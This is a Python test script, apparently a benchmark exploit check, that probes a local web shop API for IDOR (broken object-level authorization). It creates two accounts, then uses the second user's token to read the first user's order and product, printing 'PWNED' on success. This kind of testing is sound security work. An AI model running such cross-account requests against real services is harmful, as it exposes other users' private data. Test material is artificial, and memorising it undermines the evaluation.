import requests
import sys
import random
import string

BASE_URL = "http://127.0.0.1:8000"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def main():
    session = requests.Session()
    # Create user1
    username1 = "user_" + random_string()
    password1 = "pass_" + random_string()
    r = session.post(f"{BASE_URL}/signup", json={"username": username1, "password": password1})
    if r.status_code != 200:
        print("safe")
        sys.exit(1)
    user1_id = r.json()["user_id"]

    # Login as user1
    r = session.post(f"{BASE_URL}/login", json={"username": username1, "password": password1})
    if r.status_code != 200:
        print("safe")
        sys.exit(1)
    token1 = r.json()["token"]
    headers1 = {"Authorization": f"Bearer {token1}"}

    # User1 creates a product
    r = session.post(f"{BASE_URL}/products", json={"name": "secret_item", "price": 100.0}, headers=headers1)
    if r.status_code != 200:
        print("safe")
        sys.exit(1)
    product_id = r.json()["id"]

    # User1 creates an order
    r = session.post(f"{BASE_URL}/orders", json={"product": "secret_item", "amount": 50.0}, headers=headers1)
    if r.status_code != 200:
        print("safe")
        sys.exit(1)
    order_id = r.json()["id"]

    # Create user2
    username2 = "user_" + random_string()
    password2 = "pass_" + random_string()
    r = session.post(f"{BASE_URL}/signup", json={"username": username2, "password": password2})
    if r.status_code != 200:
        print("safe")
        sys.exit(1)
    user2_id = r.json()["user_id"]

    # Login as user2
    r = session.post(f"{BASE_URL}/login", json={"username": username2, "password": password2})
    if r.status_code != 200:
        print("safe")
        sys.exit(1)
    token2 = r.json()["token"]
    headers2 = {"Authorization": f"Bearer {token2}"}

    # Try to read user1's order as user2 (IDOR / Broken Object-Level Authorization)
    r = session.get(f"{BASE_URL}/orders/{order_id}", headers=headers2)
    if r.status_code == 200 and r.json().get("user_id") == user1_id:
        print("PWNED")
        sys.exit(0)

    # Try to read user1's product as user2 (IDOR)
    r = session.get(f"{BASE_URL}/products/{product_id}", headers=headers2)
    if r.status_code == 200:
        print("PWNED")
        sys.exit(0)

    print("safe")
    sys.exit(1)

if __name__ == "__main__":
    main()